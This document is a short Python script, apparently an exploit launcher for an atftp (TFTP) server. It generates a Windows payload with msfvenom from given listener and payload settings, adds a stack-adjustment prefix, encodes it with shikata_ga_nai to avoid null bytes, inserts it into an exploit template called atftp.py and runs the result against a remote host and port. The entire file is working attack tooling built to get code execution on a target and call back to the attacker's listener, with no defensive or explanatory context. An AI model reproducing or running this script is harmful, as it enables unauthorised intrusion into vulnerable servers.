import os
import sys
import subprocess

def Cmd(s):
	return subprocess.check_output(s, shell=True)

if len(sys.argv) < 6:
	print(__file__ + " LHOST LPORT PAYLOAD RHOST RPORT")
	exit(0)

lhost = sys.argv[1]
lport = sys.argv[2]
payload = sys.argv[3]
rhost = sys.argv[4]
rport = sys.argv[5]
arch = 'x86'
output_code = 'atftp-exploit.py'

stackadj = Cmd("perl -e 'print \"\\x81\\xec\\xac\\x0d\\x00\\x00\"'")
payload = Cmd("msfvenom -p %s LHOST=%s LPORT=%s -f raw -a %s --platform win" % (payload, lhost, lport, arch))
shellcode = stackadj + payload

p = subprocess.Popen("msfvenom -b '\\x00' -e x86/shikata_ga_nai -f python -a %s --platform win" % arch, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
p.stdin.write(shellcode)
pyVar, _ = p.communicate()

#os.system("cat shellcode | msfvenom -b '\x00' -e x86/shikata_ga_nai -f python -a %s --platform win >pyVar" % arch)

src = open("atftp.py").read()
open(output_code, "w").write(src.replace("#<here>", pyVar + "payload = buf\n"))

cmd = 'python %s %s %s %s 9' % (output_code, rhost, rport, lhost)
print("Running command: %s" % cmd)
os.system(cmd)
